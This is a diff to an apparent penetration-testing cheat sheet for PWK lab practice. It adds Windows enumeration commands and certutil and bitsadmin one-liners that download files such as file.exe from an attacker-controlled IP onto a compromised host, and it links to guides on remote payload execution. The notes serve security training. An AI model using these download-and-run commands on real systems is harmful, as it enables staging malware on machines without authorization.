@@ -70,7 +70,8 @@
     qwinsta                             #is anyone else logged in?   
     net localgroup  
     ipconfig /all  
-    route print  
+    route print     
+    arp -a    
     dir /r    
     tree /a /f                        #dir walk 
     set                               #enviromental variables  
@@ -406,14 +407,17 @@ ____
 [Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)   
 [Windows One liners for file uploading](https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/)     
 
-**try certutil or impacket first - sometimes Powershell has problems, check size of file to see if transfer was successful** 
+**try certutil / bitsadmin first, then impacket - sometimes Powershell has problems, check size of file to see if transfer was successful** 
 Windows XP and earlier: TFTP, Impacket
-Windows 7 - 8.1: Certutil, Impacket, PowerShell 
-Windows 10: Certutil, Impacket, Curl, Powershell 
+Windows 7 - 8.1: Certutil, bitsadmin, Impacket, PowerShell    
+Windows 10: Certutil, Impacket, Curl, Powershell   
 
-### Certutil 
+### Certutil    
+
     certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
-    
+### Bitsadmin      
+
+    bitsadmin /create 1 bitsadmin /addfile 1 http://10.10.10.10:80/file.exe file.exe bitsadmin /RESUME 1 bitsadmin /complete 1   
 ### Old Boxes (Windows XP and before)  
 For PWK labs - TFTP usually enabled 
 metasploit tfp server module on Kali
